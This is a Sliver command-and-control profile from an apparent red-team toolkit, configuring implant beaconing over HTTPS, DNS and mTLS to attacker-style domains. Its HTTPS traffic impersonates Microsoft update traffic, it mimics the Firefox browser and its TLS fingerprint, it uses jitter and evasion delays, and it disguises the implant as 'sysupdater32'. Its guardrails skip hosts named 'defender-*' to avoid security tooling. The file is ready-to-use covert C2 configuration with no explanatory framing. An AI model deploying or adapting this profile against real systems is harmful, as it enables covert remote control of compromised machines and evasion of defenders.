# redteam_toolkit/c2_profiles/sliver/sliver.profile

name = "genesis-stealth-mtls"

transport {
  type = "https"
  uri = ["/favicon.ico", "/update", "/api/v2/metrics"]
  host_header = "update.cdn.microsoft-services.com"
  useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0"
  http_verbs = ["POST", "GET", "PUT"]
  headers = {
    "X-Session-Id" = "keep-alive",
    "X-Forwarded-For" = "127.0.0.1"
  }
  jitter = 10-25
  max_retries = 5
  sleep = 90s
  kill_date = "2025-12-30"
  use_custom_cert = true
  cert_path = "/opt/sliver_certs/genesis.pem"
  key_path = "/opt/sliver_certs/genesis.key"
}

dns {
  type = "dns"
  domain = "dns.genesis-c2.com"
  max_txt_length = 200
  query_delay = "60s"
  max_queries = 10
  padding = true
  subdomain_format = "%r.%i.%d"
}

mtls {
  domain = "c2.genesis-secure.net"
  cert_path = "/opt/sliver_certs/genesis-client.pem"
  key_path = "/opt/sliver_certs/genesis-client.key"
  ca_cert_path = "/opt/sliver_certs/genesis-root-ca.pem"
}

advanced {
  implant_name = "sysupdater32"
  evasion_delay = 250ms
  sleep_jitter = 15
  max_connections = 3
  endpoint_obfuscation = true
  tls_fingerprint = "firefox_latest"
  implant_guardrails = [
    "geo:only=SE,CH,FI",
    "hostname:deny=defender-*",
    "user:deny=admin"
  ]
}
